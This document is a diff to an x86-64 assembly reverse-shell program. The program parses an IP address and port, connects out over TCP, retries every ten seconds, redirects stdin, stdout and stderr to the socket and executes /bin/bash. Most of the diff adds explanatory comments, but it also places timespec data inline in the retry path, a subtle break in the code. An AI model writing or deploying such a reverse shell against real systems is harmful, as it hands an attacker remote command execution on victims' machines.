@@ -19,7 +19,7 @@ _start:
     test rax, rax
     jz ip_format_error
     
-
+    ; Validate port
     call validate_port
     test rax, rax
     jz port_error
@@ -34,19 +34,19 @@ validate_and_parse_ip:
     push rdx
     push r9
     
-    lea rsi, [ip_str]       
-    lea rdi, [ip_bytes]     
-    xor rbx, rbx           
-    xor rax, rax           
-    xor rcx, rcx           
-    xor r9, r9              
+    lea rsi, [ip_str]       ; Source string
+    lea rdi, [ip_bytes]     ; Destination (will store as single dword)
+    xor rbx, rbx            ; Byte counter (0-3)
+    xor rax, rax            ; Current number
+    xor rcx, rcx            ; Character index
+    xor r9, r9              ; Final IP value (32-bit)
     
 parse_ip_loop:
-    movzx rdx, byte [rsi + rcx]  
-    test rdx, rdx                
+    movzx rdx, byte [rsi + rcx]  ; Load next character
+    test rdx, rdx                ; Check for null terminator
     jz validate_last_octet
     
-    cmp rdx, '.'                 
+    cmp rdx, '.'                 ; Check for dot separator
     je store_octet
     
     cmp rdx, '0'
@@ -65,19 +65,21 @@ parse_ip_loop:
     jmp parse_ip_loop
 
 store_octet:
-    cmp rbx, 3               
+    ; Store current octet in the correct position
+    cmp rbx, 3               ; Check if we have too many octets
     jae ip_invalid
     
     shl r9, 8
     or r9, rax
     
     inc rbx
-    xor rax, rax           
+    xor rax, rax             ; Reset for next octet
     inc rcx
     jmp parse_ip_loop
 
 validate_last_octet:
-    cmp rbx, 3              
+    ; Store the last octet
+    cmp rbx, 3               ; Must be exactly 4th octet
     jne ip_invalid
     
     shl r9, 8
@@ -87,7 +89,7 @@ validate_last_octet:
     bswap eax
     mov dword [ip_bytes], eax
     
-    mov rax, 1               
+    mov rax, 1               ; Success
     jmp ip_parse_done
 
 ip_invalid:
@@ -136,32 +138,32 @@ port_valid_done:
 connect:
     ; socket(AF_INET, SOCK_STREAM, 0)
     mov rax, 41
-    mov rdi, 2         
-    mov rsi, 1          
+    mov rdi, 2          ; AF_INET
+    mov rsi, 1          ; SOCK_STREAM
     mov rdx, 0
     syscall 
     
     test rax, rax
     js socket_error
-    mov r8, rax         
+    mov r8, rax         ; Save socket fd
     
-   
-    sub rsp, 16        
-    mov word [rsp], 2   
+    ; Prepare sockaddr structure on stack
+    sub rsp, 16         ; Allocate space for sockaddr_in
+    mov word [rsp], 2   ; AF_INET
     mov ax, [port_bytes]
-    mov word [rsp+2], ax 
+    mov word [rsp+2], ax ; Port
     mov eax, [ip_bytes]
-    mov dword [rsp+4], eax 
-    mov qword [rsp+8], 0  
+    mov dword [rsp+4], eax ; IP
+    mov qword [rsp+8], 0   ; Zero padding
     
     ; connect(socket, sockaddr, 16)
-    mov rdi, r8        
-    mov rsi, rsp       
-    mov rdx, 16         
-    mov rax, 42         
+    mov rdi, r8         ; Socket fd
+    mov rsi, rsp        ; sockaddr structure
+    mov rdx, 16         ; Address length
+    mov rax, 42         ; sys_connect
     syscall
     
-    add rsp, 16         
+    add rsp, 16         ; Clean up stack
     
     test rax, rax
     js wait_and_retry
@@ -170,22 +172,21 @@ connect:
     jmp dup2_loop
 
 wait_and_retry:
-    sub rsp, 16
-    mov qword [rsp], 10     
-    mov qword [rsp+8], 0   
-    
-    mov rax, 35         
-    mov rdi, rsp
+timespec:
+    dq 10
+    dq 0
+
+    ; nanosleep(10, 0)
+    mov rax, 35
+    lea rdi, [rel timespec]
     xor rsi, rsi
     syscall
-    
-    add rsp, 16
     jmp connect
 
 dup2_loop:
     ; dup2(client_fd, new_fd)
-    mov rax, 33         
-    mov rdi, r8         
+    mov rax, 33         ; sys_dup2
+    mov rdi, r8         ; Source fd (socket)
     ; rsi contains target fd (0, 1, 2)
     syscall
     
@@ -197,39 +198,40 @@ dup2_loop:
     jne dup2_loop
     
     ; execve("/bin/bash", NULL, NULL)
-    mov rax, 59         
+    mov rax, 59         ; sys_execve
     lea rdi, [command]
-    xor rsi, rsi        
-    xor rdx, rdx        
+    xor rsi, rsi        ; argv = NULL  
+    xor rdx, rdx        ; envp = NULL
     syscall
     
+    ; Should not reach here
     jmp exit_with_error
 
 ip_format_error:
-    mov rax, 1          
-    mov rdi, 2          
+    mov rax, 1          ; sys_write
+    mov rdi, 2          ; stderr
     lea rsi, [err_ip_format]
     mov rdx, 26
     syscall
     jmp exit_with_error
 
 port_error:
-    mov rax, 1         
-    mov rdi, 2          
+    mov rax, 1          ; sys_write
+    mov rdi, 2          ; stderr
     lea rsi, [err_wrong_port]
     mov rdx, 23
     syscall
     jmp exit_with_error
 
 socket_error:
-    mov rax, 1          
-    mov rdi, 2         
+    mov rax, 1          ; sys_write
+    mov rdi, 2          ; stderr
     lea rsi, [err_socket]
     mov rdx, 28
     syscall
     jmp exit_with_error
 
 exit_with_error:
-    mov rax, 60         
-    mov rdi, 1         
+    mov rax, 60         ; sys_exit
+    mov rdi, 1          ; Exit code 1
     syscall
